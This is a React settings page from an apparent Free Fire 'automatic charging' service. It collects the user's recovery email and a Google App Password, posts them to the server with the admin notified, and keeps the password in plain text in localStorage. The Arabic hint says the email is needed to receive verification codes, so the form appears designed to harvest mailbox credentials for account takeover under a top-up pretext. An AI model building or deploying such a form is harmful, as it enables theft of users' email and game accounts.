import React, { useState, useEffect } from 'react';
import { ArrowLeft, Save, ShieldAlert, Check, HelpCircle } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { useLanguage } from '../context/LanguageContext';

export default function Settings() {
  const { language } = useLanguage();
  const navigate = useNavigate();
  const [linkedEmail, setLinkedEmail] = useState('');
  const [appPassword, setAppPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [isFetching, setIsFetching] = useState(true);

  useEffect(() => {
    fetchUserSettings();
  }, []);

  const fetchUserSettings = async () => {
    setIsFetching(true);
    try {
      const token = localStorage.getItem('ff_token');
      if (!token) {
        navigate('/');
        return;
      }
      const res = await axios.get('/api/user/me', {
        headers: { Authorization: `Bearer ${token}` }
      });
      if (res.data?.user) {
        setLinkedEmail(res.data.user.linked_email || '');
        setAppPassword(res.data.user.app_password || '');
        
        // Update local user record
        const savedUser = localStorage.getItem('ff_user');
        let parsedSaved = {};
        if (savedUser && savedUser !== 'undefined') {
          try {
            parsedSaved = JSON.parse(savedUser);
          } catch (e) {}
        }
        localStorage.setItem('ff_user', JSON.stringify({ ...parsedSaved, ...res.data.user }));
      }
    } catch (err) {
      console.error('Failed to fetch user settings:', err);
    } finally {
      setIsFetching(false);
    }
  };

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setSuccess('');

    if (!linkedEmail.trim()) {
      setError(language === 'ar' ? 'يرجى إدخال إيميل الربط / الاستعادة' : 'Please enter the recovery/linking email');
      setLoading(false);
      return;
    }

    if (!appPassword.trim()) {
      setError(language === 'ar' ? 'يرجى إدخال كلمة مرور التطبيقات' : 'Please enter the App Password');
      setLoading(false);
      return;
    }

    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(linkedEmail.trim())) {
      setError(language === 'ar' ? 'صيغة البريد الإلكتروني غير صحيحة' : 'Invalid email format');
      setLoading(false);
      return;
    }

    try {
      const token = localStorage.getItem('ff_token');
      const res = await axios.post('/api/user/save-settings', {
        linked_email: linkedEmail.trim(),
        app_password: appPassword.trim()
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });

      if (res.data?.status === 'success') {
        setSuccess(language === 'ar' ? 'تم حفظ الإعدادات بنجاح وإشعار الإدارة!' : 'Settings saved successfully and admin notified!');
        
        // Update local user object
        const savedUser = localStorage.getItem('ff_user');
        if (savedUser && savedUser !== 'undefined') {
          try {
            const parsed = JSON.parse(savedUser);
            parsed.linked_email = linkedEmail.trim();
            parsed.app_password = appPassword.trim();
            localStorage.setItem('ff_user', JSON.stringify(parsed));
          } catch (e) {}
        }
      }
    } catch (err: any) {
      setError(err.response?.data?.message || (language === 'ar' ? 'حدث خطأ أثناء حفظ الإعدادات' : 'Error saving settings'));
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen w-full relative bg-white md:bg-[#F9FAFB] font-sans pb-24" dir={language === 'ar' ? 'rtl' : 'ltr'}>
      <div className="relative z-10 mx-auto max-w-md h-full min-h-screen md:min-h-fit md:p-6 md:pt-8">
        <div className="md:rounded-[36px] md:border border-gray-100 bg-white md:shadow-[0_20px_60px_rgba(0,0,0,0.06)] overflow-hidden mb-0 md:mb-4 relative pb-12 min-h-screen md:min-h-[500px] flex flex-col">
          
          {/* Header */}
          <div className="p-6 border-b border-gray-100 flex items-center justify-between">
            <button 
              onClick={() => navigate('/account')}
              className="p-2 rounded-xl hover:bg-gray-100 transition-colors text-gray-500 focus:outline-none"
              id="back_button"
            >
              <ArrowLeft className={`h-5 w-5 ${language === 'ar' ? 'rotate-180' : ''}`} />
            </button>
            <h1 className="text-lg font-black text-gray-900">
              {language === 'ar' ? 'الإعدادات' : 'Settings'}
            </h1>
            <div className="w-9 h-9"></div> {/* spacing element */}
          </div>

          <div className="p-6 flex-1 flex flex-col">
            {isFetching ? (
              <div className="flex-1 flex flex-col items-center justify-center space-y-3">
                <div className="h-10 w-10 border-4 border-slate-200 border-t-red-600 rounded-full animate-spin"></div>
                <span className="text-xs font-bold text-gray-500">
                  {language === 'ar' ? 'جاري تحميل الإعدادات الحالية...' : 'Loading current settings...'}
                </span>
              </div>
            ) : (
              <form onSubmit={handleSave} className="space-y-6">
                
                {/* Warning Alert */}
                <div className="rounded-2xl bg-amber-50/70 border border-amber-100 p-4.5 flex gap-3">
                  <ShieldAlert className="h-5 w-5 text-amber-600 shrink-0 mt-0.5" />
                  <div className="text-[12px] leading-relaxed font-bold text-amber-900">
                    {language === 'ar' ? (
                      <p>مطلوب ملء هذه الإعدادات وتأكيدها لتفعيل خادم الشحن التلقائي</p>
                    ) : (
                      <p>These settings must be configured to activate the automatic charging server.</p>
                    )}
                  </div>
                </div>

                {/* Field 1: Linked Email */}
                <div className="space-y-1.5">
                  <label className="block text-xs font-black text-gray-700 mr-1">
                    {language === 'ar' ? 'إيميل الربط / الاستعادة' : 'Recovery / Linking Email'}
                  </label>
                  <input
                    type="email"
                    required
                    value={linkedEmail}
                    onChange={(e) => setLinkedEmail(e.target.value)}
                    placeholder={language === 'ar' ? 'مثال: example@gmail.com' : 'e.g. example@gmail.com'}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50/50 p-4 text-sm font-semibold text-gray-800 outline-none focus:border-red-500 focus:bg-white transition-all shadow-sm"
                    dir="ltr"
                  />
                  <p className="text-[10px] font-bold text-gray-400 mr-1 leading-normal">
                    {language === 'ar' 
                      ? 'البريد الإلكتروني المربوط بحسابك فري فاير كبريد استعادة لتلقي أكواد التحقق.' 
                      : 'The recovery/linking email connected to your Free Fire account.'}
                  </p>
                </div>

                {/* Field 2: App Password */}
                <div className="space-y-1.5">
                  <label className="block text-xs font-black text-gray-700 mr-1">
                    {language === 'ar' ? 'كلمة مرور التطبيقات (App Password)' : 'App Password'}
                  </label>
                  <input
                    type="text"
                    required
                    value={appPassword}
                    onChange={(e) => setAppPassword(e.target.value)}
                    placeholder={language === 'ar' ? 'مثال: abcd efgh ijkl mnop' : 'e.g. abcd efgh ijkl mnop'}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50/50 p-4 text-sm font-mono text-gray-800 outline-none focus:border-red-500 focus:bg-white transition-all shadow-sm"
                    dir="ltr"
                  />
                  <p className="text-[10px] font-bold text-gray-400 mr-1 leading-normal">
                    {language === 'ar' 
                      ? 'كلمة مرور تطبيقات مكونة من 16 حرفاً يتم توليدها من حساب Google الخاص بك (وليس كلمة مرور الحساب العادية).' 
                      : 'A 16-character App Password generated from your Google Account settings.'}
                  </p>
                </div>

                {/* Notifications */}
                {error && (
                  <div className="rounded-2xl bg-red-50 border border-red-100 p-4 text-xs font-bold text-red-600 text-center animate-fade-in">
                    {error}
                  </div>
                )}

                {success && (
                  <div className="rounded-2xl bg-emerald-50 border border-emerald-100 p-4 text-xs font-bold text-emerald-600 text-center flex items-center justify-center gap-2 animate-fade-in">
                    <Check className="h-4 w-4" />
                    <span>{success}</span>
                  </div>
                )}

                {/* Submit button */}
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full rounded-2xl bg-[#CD1212] hover:bg-red-700 py-4 font-black text-white transition-all shadow-md active:scale-95 flex items-center justify-center gap-2 text-sm disabled:opacity-50"
                >
                  <Save className="h-4.5 w-4.5" />
                  <span>
                    {loading 
                      ? (language === 'ar' ? 'جاري حفظ الإعدادات...' : 'Saving settings...') 
                      : (language === 'ar' ? 'حفظ الإعدادات' : 'Save Settings')}
                  </span>
                </button>

              </form>
            )}
          </div>

        </div>
      </div>
    </div>
  );
}
